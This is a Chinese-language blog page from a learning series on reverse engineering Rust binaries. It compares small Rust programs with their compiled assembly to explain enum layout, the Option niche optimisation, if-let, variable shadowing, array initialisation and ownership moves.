<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::any::Any;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Freshman</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">Sophomore</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">Junior</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">Senior</span>(<span class="type">String</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">get_student</span>(grade: <span class="type">i32</span>, name: <span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;Student&gt; &#123;</span><br><span class="line">    <span class="keyword">match</span> grade &#123;</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Freshman</span>(name)),</span><br><span class="line">        <span class="number">2</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Sophomore</span>(name)),</span><br><span class="line">        <span class="number">3</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Junior</span>(name)),</span><br><span class="line">        <span class="number">4</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Senior</span>(name)),</span><br><span class="line">        _ =&gt; <span class="literal">None</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">test</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">        <span class="keyword">match</span> <span class="keyword">self</span> &#123;</span><br><span class="line">            Student::<span class="title function_ invoke__">Freshman</span>(name) =&gt; <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="string">&quot;Calculus&quot;</span>).<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            Student::<span class="title function_ invoke__">Sophomore</span>(name) =&gt; <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="string">&quot;Data Structure&quot;</span>).<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            Student::<span class="title function_ invoke__">Junior</span>(name) =&gt; <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="string">&quot;Computer Network&quot;</span>).<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            Student::<span class="title function_ invoke__">Senior</span>(name) =&gt; <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="string">&quot;Graduation Design&quot;</span>).<span class="title function_ invoke__">to_string</span>()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="title function_ invoke__">get_student</span>(<span class="number">4</span>, <span class="string">&quot;CoLin&quot;</span>.<span class="title function_ invoke__">to_string</span>()).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, x.<span class="title function_ invoke__">test</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中对于<code>test</code>方法的调用如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, qword ptr [rip + core::option::Option&lt;T&gt;::unwrap@GOTPCREL]</span><br><span class="line">lea     rdi, [rsp + 40]</span><br><span class="line">mov     qword ptr [rsp + 32], rdi</span><br><span class="line">call    rax</span><br><span class="line">mov     rsi, qword ptr [rsp + 32]</span><br><span class="line">lea     rdi, [rsp + 192]</span><br><span class="line">call    example::Student::test</span><br><span class="line">jmp     .LBB26_3</span><br></pre></td></tr></table></figure>
<p>可以看到方法的第一个参数依然是<code>self</code>，第二个参数则是等待初始化的<code>String</code>实例地址。在代码中是返回<code>String</code>实例，实际上是传入未初始化的指针。</p>
<h2 id="optiont"><a class="markdownIt-Anchor" href="#optiont"></a> <code>Option&lt;T&gt;</code></h2>
<p>针对<code>Option&lt;T&gt;</code>，Rust在汇编层有自己的处理方式。如果将<code>Option&lt;T&gt;</code>看做一个普通的枚举类型，且<code>Some</code>后面带的是另一个枚举类型，那么这样的话就会产生两层枚举对象，不太优雅。对于<code>get_student</code>函数，下面是部分反编译结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000009702 48 89 4C 24 18                mov     [rsp+108h+var_F0], rcx</span><br><span class="line">.text:0000000000009707 83 E8 03                      sub     eax, 3</span><br><span class="line">.text:000000000000970A 77 15                         ja      short def_971F                  ; jumptable 000000000000971F default case</span><br><span class="line">.text:000000000000970A</span><br><span class="line">.text:000000000000970C 48 8B 44 24 18                mov     rax, [rsp+108h+var_F0]</span><br><span class="line">.text:0000000000009711 48 8D 0D B4 09 04 00          lea     rcx, jpt_971F</span><br><span class="line">.text:0000000000009718 48 63 04 81                   movsxd  rax, ds:(jpt_971F - 4A0CCh)[rcx+rax*4]</span><br><span class="line">.text:000000000000971C 48 01 C8                      add     rax, rcx</span><br><span class="line">.text:000000000000971F FF E0                         jmp     rax                             ; switch jump</span><br><span class="line">.text:000000000000971F</span><br><span class="line">.text:0000000000009721                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000009721</span><br><span class="line">.text:0000000000009721                               def_971F:                               ; CODE XREF: revlab::get_student::h5c77d454e35cea03+3A↑j</span><br><span class="line">.text:0000000000009721 48 8B 44 24 08                mov     rax, [rsp+108h+var_100]         ; jumptable 000000000000971F default case</span><br><span class="line">.text:0000000000009726 48 C7 00 04 00 00 00          mov     qword ptr [rax], 4</span><br><span class="line">.text:000000000000972D E9 43 02 00 00                jmp     loc_9975</span><br></pre></td></tr></table></figure>
<p>下面的<code>def_971F</code>为默认分支，可以看到这里是将枚举类型的索引值赋值为4，但上面定义的枚举类型一共只有4个值，最大的索引值只能为3。将索引值设置为4实际上也就表示这个枚举类型是一个无效值，这样在内存中实际上并不存在二重枚举类型，而是只有一个<code>Student</code>枚举类型。由此可见，对泛型参数为枚举类型的<code>Option</code>，Rust进行了优化。</p>
<h1 id="reverse-for-if-let"><a class="markdownIt-Anchor" href="#reverse-for-if-let"></a> Reverse for if-let</h1>
<p>if let语句是针对只有一个处理条件和一个默认条件的<code>match</code>语句的平替。由于只有一个特殊条件和默认条件，因此在实际实现中只需要使用类似于if的逻辑即可完成。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="title function_ invoke__">get_student</span>(<span class="number">4</span>, <span class="string">&quot;CoLin&quot;</span>.<span class="title function_ invoke__">to_string</span>());</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(Student::<span class="title function_ invoke__">Senior</span>(y)) = x &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 216</span><br><span class="line">        mov     byte ptr [rsp + 183], 0</span><br><span class="line">        lea     rdi, [rsp + 56]</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_5]</span><br><span class="line">        mov     edx, 5</span><br><span class="line">        call    &lt;str as alloc::string::ToString&gt;::to_string</span><br><span class="line">        lea     rdi, [rsp + 24]</span><br><span class="line">        mov     esi, 4</span><br><span class="line">        lea     rdx, [rsp + 56]</span><br><span class="line">        call    qword ptr [rip + example::get_student@GOTPCREL]</span><br><span class="line">        mov     byte ptr [rsp + 183], 1</span><br><span class="line">        mov     eax, 1</span><br><span class="line">        xor     ecx, ecx</span><br><span class="line">        cmp     qword ptr [rsp + 24], 4</span><br><span class="line">        cmove   rax, rcx</span><br><span class="line">        cmp     rax, 1</span><br><span class="line">        jne     .LBB18_2</span><br><span class="line">        cmp     qword ptr [rsp + 24], 3</span><br><span class="line">        je      .LBB18_3</span><br></pre></td></tr></table></figure>
<p>可以发现，这里的判断逻辑和<code>match</code>是类似的，都是对枚举索引值进行比较。</p>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
<p>本文学习了：</p>
<ol>
<li>Rust 结构体的内存排布以及结构体方法的参数传递，结构体方法参数传递遵照this参数传递法</li>
<li>Rust 枚举类型方法的参数传递与结构体方法的参数传递类似</li>
<li>Rust if-let语句的判断逻辑，<code>Option&lt;T&gt;</code>的内存结构</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/10/27/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/27/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-3/" class="post-title-link" itemprop="url">Rust逆向学习 (3)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-10-27 18:18:15" itemprop="dateCreated datePublished" datetime="2023-10-27T18:18:15+08:00">2023-10-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-11-10 14:42:05" itemprop="dateModified" datetime="2023-11-10T14:42:05+08:00">2023-11-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>7.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在本文中，我们将跟随《Rust权威指南》的学习路线，继续进行Rust逆向的学习。</p>
<p>前两篇文章中，我们对猜数字这个程序进行了详细的逆向分析，学习了Rust元组、枚举类型、控制结构、函数调用规则等基础的Rust汇编语言层结构。本文将针对第3章——通用编程概念与第4章——认识所有权的部分内容，对书中提到的Rust特性进行逆向分析。一方面学习逆向，另一方面深入理解Rust语言本身。</p>
<h1 id="reverse-for-shadow"><a class="markdownIt-Anchor" href="#reverse-for-shadow"></a> Reverse for Shadow</h1>
<p>Rust逆向中有一个“隐藏”（Shadow）的概念。它指的是一个变量可以多次被<code>let</code>关键字修饰，第二次通过<code>let</code>关键字定义变量可以改变原变量的类型，或改变原变量的值。如书中的示例：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = x + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = x * <span class="number">2</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如此通过<code>let</code>关键字改变变量，与直接将变量用<code>mut</code>关键字声明的区别是可以在改变变量值的情况下保证变量的不可变性，还能够修改变量的类型。那么对于汇编语言层而言，在不改变变量类型的情况下，shadow特性是否会修改变量的保存位置？如果修改了变量类型，Rust又会将新的变量保存到什么位置呢？</p>
<h2 id="0x01-变量类型不修改"><a class="markdownIt-Anchor" href="#0x01-变量类型不修改"></a> 0x01. 变量类型不修改</h2>
<p>在没有修改变量类型的情况下，我们使用下面的代码示例进行测试：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, x); </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = x + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = x + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>, x, y); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里每行语句的内容以及顺序是笔者通过调试选择的。</p>
<p>如果没有第一句<code>println!</code>语句，5这个值将会被保存到<code>eax</code>之中而不是一开始保存到内存，随后首先计算5+2将7保存到内存中某个位置。然后代码中通过<code>mov eax, 5</code>再将5赋值给x，计算5+1将6保存到内存中另一个位置。这是Rust编译器优化的结果，减少了内存交互。</p>
<p>而如果将第一个<code>println!</code>语句加上，情况则大不相同。因为根据我们前面文章的分析，<code>println!</code>需要首先获取若干个指针将第一个参数字符串中的中括号内容进行替换，因此在执行第一句<code>println!</code>前，<code>x</code>这个值必须要被保存到内存之中。使用网站编译后获取的部分汇编代码如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 216</span><br><span class="line">        mov     dword ptr [rsp + 12], 5</span><br><span class="line">        lea     rax, [rsp + 12]</span><br><span class="line">        mov     qword ptr [rsp + 200], rax</span><br><span class="line">        mov     rax, qword ptr [rip + core::fmt::num::imp::&lt;impl core::fmt::Display for i32&gt;::fmt@GOTPCREL]</span><br><span class="line">        mov     qword ptr [rsp + 208], rax</span><br><span class="line">        mov     rcx, qword ptr [rsp + 200]</span><br><span class="line">        mov     rax, qword ptr [rsp + 208]</span><br><span class="line">        mov     qword ptr [rsp + 64], rcx</span><br><span class="line">        mov     qword ptr [rsp + 72], rax</span><br><span class="line">        lea     rdi, [rsp + 16]</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_4]</span><br><span class="line">        mov     edx, 2</span><br><span class="line">        lea     rcx, [rsp + 64]</span><br><span class="line">        mov     r8d, 1</span><br><span class="line">        call    core::fmt::Arguments::new_v1</span><br><span class="line">        lea     rdi, [rsp + 16]</span><br><span class="line">        call    qword ptr [rip + std::io::stdio::_print@GOTPCREL]</span><br><span class="line">        mov     eax, dword ptr [rsp + 12]</span><br><span class="line">        add     eax, 2</span><br><span class="line">        mov     dword ptr [rsp + 8], eax</span><br><span class="line">        seto    al</span><br><span class="line">        test    al, 1</span><br><span class="line">        jne     .LBB1_2</span><br><span class="line">        mov     eax, dword ptr [rsp + 8]</span><br><span class="line">        mov     dword ptr [rsp + 80], eax</span><br><span class="line">        mov     eax, dword ptr [rsp + 12]</span><br><span class="line">        inc     eax</span><br><span class="line">        mov     dword ptr [rsp + 4], eax</span><br><span class="line">        seto    al</span><br><span class="line">        test    al, 1</span><br><span class="line">        jne     .LBB1_4</span><br><span class="line">        jmp     .LBB1_3</span><br></pre></td></tr></table></figure>
<p>可以看到，5这个值首先被保存到了<code>[rsp+12]</code>这个地方。在输出后从这个地方取出值，+2，保存到<code>[rsp+8]</code>作为y。下面的<code>seto</code>指令指的是如果该指令执行时将溢出标志位（OF）的值保存到唯一一个操作数，也就是<code>al</code>中，这个主要是为了检查整数运算是否产生了数值溢出。</p>
<p>最后一部分，可以看到<code>eax</code>取出<code>[rsp+12]</code>这个地址的内容，+1，再保存到了另外一个地址空间<code>[rsp+4]</code>中。也就是说，这里Rust编译器选择不复用原来的内存空间，即使原来的内存空间在正常情况下已经不会再被访问。这造成了4字节的内存空间浪费。上述的代码是以无优化模式进行编译，没有进行优化。</p>
<p>不过当笔者在编译选项中添加<code>-C opt-level=3</code>，即最高级别优化时，具体的汇编代码虽然有所不同，原先的整数计算将不再进行溢出检查，但是<code>x</code>在shadow之后依然被保存到了不同的内存空间之中。</p>
<h2 id="0x02-变量类型修改"><a class="markdownIt-Anchor" href="#0x02-变量类型修改"></a> 0x02. 变量类型修改</h2>
<p>当变量类型修改时，有三种情况可能产生：新的变量类型占用的内存空间大小不变或更大或更小。</p>
<p>将上一节Rust代码中第二次使用<code>let</code>关键字定义的变量<code>x</code>从<code>i32</code>类型改变为<code>u32</code>类型，最终保存变量的内存空间排布与上一节完全相同，唯一不同的是溢出检查变成了<code>setb</code>命令，这个命令相当于是将进位/借位标志位赋值给寄存器，也就是检查无符号整数溢出的。</p>
<p>将上一节中的shadow变量<code>x</code>从<code>i32</code>类型改为<code>i16</code>类型，即将变量占用的内存空间变小，最终的结果依然是不会复用。改为<code>i64</code>类型也是如此。</p>
<p>由此可以得出结论：<strong>Rust中一个变量将另一个变量隐藏后，无论新的变量类型是什么，都不会使用原来的变量内存空间保存新的变量。</strong></p>
<p>另外，当旧值为一个对象实例时，隐藏旧值后旧值将会自动删除。</p>
<p>经过思考，笔者认为Rust编译器这样做的原因是：有的时候一个变量将另一个变量隐藏时，新赋的值可能需要旧值参与运算。如果旧值为指针，那么此时新值不可能复用旧值的内存空间，旧值需要在新值赋值运算进行过程中一直保持不变，因此不复用内存空间在编译器设计上反而是最为简单的。另外，旧值在被隐藏后生命周期不会立即结束，针对其的引用依然能够使用，不过如果其所有权没有被夺走，隐藏后就无法获取其所有权了。</p>
<h1 id="reverse-for-array"><a class="markdownIt-Anchor" href="#reverse-for-array"></a> Reverse for Array</h1>
<p>Rust语言中有数组结构，对于数组的定义，Rust有较为方便的定义方式。当需要连续多个相同的值到相邻的数组索引时，可以使用分号定义，如<code>[5;5]</code>即为长度为5，5个索引值全为5的数组。</p>
<p>下面是<code>let x = [5; 10]</code>的反编译：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        xor     eax, eax</span><br><span class="line">        mov     qword ptr [rsp - 48], rax</span><br><span class="line">.LBB0_1:</span><br><span class="line">        mov     rax, qword ptr [rsp - 48]</span><br><span class="line">        mov     qword ptr [rsp - 56], rax</span><br><span class="line">        cmp     rax, 10</span><br><span class="line">        jae     .LBB0_3</span><br><span class="line">        mov     rax, qword ptr [rsp - 56]</span><br><span class="line">        mov     dword ptr [rsp + 4*rax - 40], 5</span><br><span class="line">        add     rax, 1</span><br><span class="line">        mov     qword ptr [rsp - 48], rax</span><br><span class="line">        jmp     .LBB0_1</span><br><span class="line">.LBB0_3:</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>可以看到这里使用了一个循环结构来为各个索引赋值，而且经过测试发现，即使分号后面是2，Rust也会使用循环来定义。当优化等级为最高时，Rust编译器会通过<code>xmmword</code>赋值，一次可以赋值4个索引16个字节的内容。</p>
<h1 id="reverse-for-moving"><a class="markdownIt-Anchor" href="#reverse-for-moving"></a> Reverse for Moving</h1>
<p>对于一个对象实例，为防止其所有权被多个变量拥有，当另外一个变量尝试获取其所有权时，原先变量对其的所有权将被夺走。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;I&#x27;m CoLin&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, x);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = x;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于上述代码，逆向出来的结果比较有趣，往下看。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sub     rsp, 280</span><br><span class="line">mov     byte ptr [rsp + 231], 0</span><br><span class="line">mov     byte ptr [rsp + 231], 1</span><br><span class="line">lea     rsi, [rip + .L__unnamed_5]</span><br><span class="line">lea     rdi, [rsp + 40]</span><br><span class="line">mov     qword ptr [rsp + 16], rdi</span><br><span class="line">mov     edx, 9</span><br><span class="line">call    &lt;alloc::string::String as core::convert::From&lt;&amp;str&gt;&gt;::from</span><br></pre></td></tr></table></figure>
<p>上面是第一行<code>from</code>函数的逆向，可以看到<code>from</code>函数实际传参用了三个寄存器，<code>rdi</code>为目的<code>String</code>实例指针，<code>rsi</code>为字符串字面量地址，<code>rdx</code>为字符串长度。可以看到这里<code>[rsp+16]</code>保存了<code>String</code>实例的栈地址，这也就是变量<code>x</code>的保存位置。</p>
<p>后面略过<code>println!</code>看第三行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mov     byte ptr [rsp + 231], 0</span><br><span class="line">mov     rax, qword ptr [rsp + 56]</span><br><span class="line">mov     qword ptr [rsp + 144], rax</span><br><span class="line">movups  xmm0, xmmword ptr [rsp + 40]</span><br><span class="line">movaps  xmmword ptr [rsp + 128], xmm0</span><br><span class="line">lea     rax, [rsp + 128]</span><br><span class="line">mov     qword ptr [rsp + 248], rax</span><br><span class="line">lea     rax, [rip + &lt;alloc::string::String as core::fmt::Display&gt;::fmt]</span><br><span class="line">mov     qword ptr [rsp + 256], rax</span><br><span class="line">mov     rax, qword ptr [rsp + 248]</span><br><span class="line">mov     qword ptr [rsp], rax</span><br></pre></td></tr></table></figure>
<p>上面的代码将<code>String</code>实例占用的0x18大小内存空间（len、ptr、capacity）拷贝到了<code>[rsp+128]</code>的地方，一次使用<code>rax</code>拷贝，一次使用<code>xmm0</code>拷贝。随后，<code>[rsp+128]</code>这个指针被拷贝到<code>[rsp+248]</code>和<code>[rsp]</code>中，推测变量<code>y</code>就保存在<code>[rsp]</code>。</p>
<p>可以看到，<code>String</code>实例的移动会在栈上再创建一个<code>String</code>实例空间，但实际指向的字符串指针相同。不过有意思的是，Rust在后续并没有对变量<code>x</code>的内存空间进行任何处理。在<code>y</code>使用完之前，<code>x</code>不能将自身的实例删除，这样相当于也删除了<code>y</code>。但后续代码将不再使用变量<code>x</code>，即如果变量<code>y</code>在后续进行了更新，字符串地址发生了改变，变量<code>x</code>中保存的字符串地址也无法同步更新。不过Rust并没有将变量<code>x</code>的所有内容清空，而是继续保留在原来的位置。也就会说，变量<code>x</code>在移动操作完成之后，其保存的内容将永远是移动操作完成前一刻的内容，且此后正常情况下不再改变。不过没有清空就意味着有数据泄露的可能性。倘若Rust代码中有Unsafe部分代码被攻击者利用，这部分数据可就危险了。</p>
<p>下面的代码示例证明了变量移动后并没有被删除。两次输出的结果相同，均为llo，你可能会想：为什么已经被Rust废弃的变量依然能够具有引用。因为Rust中的废弃和生命周期走向结束并不相同，废弃仅仅代表后续代码无法对其进行访问，无法获取其所有权，但对于引用类型，还是可以使用的，但无法获取其所有权。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span>: <span class="type">String</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = &amp;x[<span class="number">2</span>..];</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;y = &#123;&#125;&quot;</span>, y);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;y = &#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
